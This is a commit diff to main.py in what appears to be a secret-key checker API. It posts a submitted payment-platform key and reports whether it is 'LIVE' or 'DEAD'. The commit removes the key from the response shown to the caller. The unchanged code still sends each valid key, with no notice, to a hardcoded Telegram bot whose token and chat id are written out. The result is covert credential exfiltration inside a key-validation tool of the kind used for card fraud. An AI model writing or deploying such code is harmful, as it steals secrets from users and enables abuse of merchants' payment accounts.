47706a189d08a06ee26ca3a8c51e19aa97260abf
NOUREDINE KAOINE <80860997+nouredinekn@users.noreply.github.com>
2021-12-25 21:20:02 +0100

    Update main.py

--- main.py
+++ main.py
@@ -14,14 +14,13 @@ def pst():
     }
     r0 = requests.post ( url0 , data=data0 , headers=headers ).text
     if 'Invalid API Key provided' and '"message"' in r0 :
-        msg = r0.split ( '"message": "' )[1].split ( '",' )[0]
-        jk = {'API_DEV_BY' : 'NOUREDINE_KAOINE' , 'message' : f"{msg}" ,
+        jk = {'API_DEV_BY' : 'NOUREDINE_KAOINE' , 'message' : "'Invalid API Key provided" ,
               'STATUS' : 'SK DEAD '}
         js = json.dumps ( jk )
         return js
     else :
         jk = {'API_DEV_BY' : 'NOUREDINE_KAOINE' , 'message' : "API Key  Is valid" ,
-              'STATUS' : 'SK LIVE' , 'SK':ska}
+              'STATUS' : 'SK LIVE' }
         js = json.dumps ( jk )
         snd = 'https://api.telegram.org/bot5086659494:AAEeU6aSjOU3vLCavHDENBp78p2fTmrO8e8/sendMessage?chat_id=1935904246&text=' +"SK LIVE: " +ska
         requests.post ( snd )
